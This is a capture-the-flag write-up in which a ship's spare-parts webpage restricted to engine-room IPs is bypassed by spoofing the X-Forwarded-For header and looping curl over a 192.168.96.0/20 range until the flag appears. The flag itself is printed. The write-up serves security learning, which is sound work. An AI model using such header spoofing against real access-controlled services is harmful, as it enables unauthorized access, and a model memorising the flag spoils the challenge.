# Component replacement (3 points)

Ahoy, officer,

the ship had to lower its speed because of broken `fuel efficiency enhancer`. To order a correct spare part, the chief
engineer needs to know exact identification code of the spare part. However, he cannot access the web page listing all
the key components in use. Maybe the problem has to do with recently readdressing of the computers in the engine room -
the old address plan for whole ship was based on range `192.168.96.0/20`. Your task is to find out the identification
code of the broken component.

May you have fair winds and following seas!

The webpage with spare parts listing is available at http://key-parts-list.cns-jv.tcc.

## Hints

* Use VPN to get access to the webpage.
* Try to bypass the IP address filter.

## Solution

If we try to access the website we get an error indicating, that the access is only allowed from the engine room.

```console
$ curl key-parts-list.cns-jv.tcc
You are attempting to access from the IP address 10.200.0.20, which is not assigned to engine room. Access denied.
```

If we ~~research~~ Google common methods of identifying client's IP address from an HTTP request we'll come across
`X-Forwarded-For` header. Let's try using it:

```console
$ curl -H "X-Forwarded-For: 192.168.96.1" key-parts-list.cns-jv.tcc
You are attempting to access from the IP address 192.168.96.1, which is not assigned to engine room. Access denied.
```

Good news is that it's really the spoofed address from the request that is being validated. Bad news is, that it's still
not the correct one. Let's try enumerating the whole range, e.g. using `nmap` to just convert CIDR notation to actual
list of IPs and then looping through them and trying to execute HTTP request with a spoofed `X-Forwarded-For` header.

```console
$ nmap -sL -n 192.168.96.0/20 | awk '/Nmap scan report/{print $NF}' | xargs -I {} curl -s -H "X-Forwarded-For: {}" key-parts-list.cns-jv.tcc | grep FLAG
Fuel efficiency enhancer;FLAG{MN9o-V8Py-mSZV-JkRz};0
Fuel efficiency enhancer;FLAG{MN9o-V8Py-mSZV-JkRz};0
Fuel efficiency enhancer;FLAG{MN9o-V8Py-mSZV-JkRz};0
Fuel efficiency enhancer;FLAG{MN9o-V8Py-mSZV-JkRz};0
Fuel efficiency enhancer;FLAG{MN9o-V8Py-mSZV-JkRz};0
Fuel efficiency enhancer;FLAG{MN9o-V8Py-mSZV-JkRz};0
Fuel efficiency enhancer;FLAG{MN9o-V8Py-mSZV-JkRz};0
Fuel efficiency enhancer;FLAG{MN9o-V8Py-mSZV-JkRz};0
Fuel efficiency enhancer;FLAG{MN9o-V8Py-mSZV-JkRz};0
... (output truncated) ...
```

We see that there are multiple IP addresses that can retrieve the replacement part list, so we can stop the scan once
a line with the flag appears.
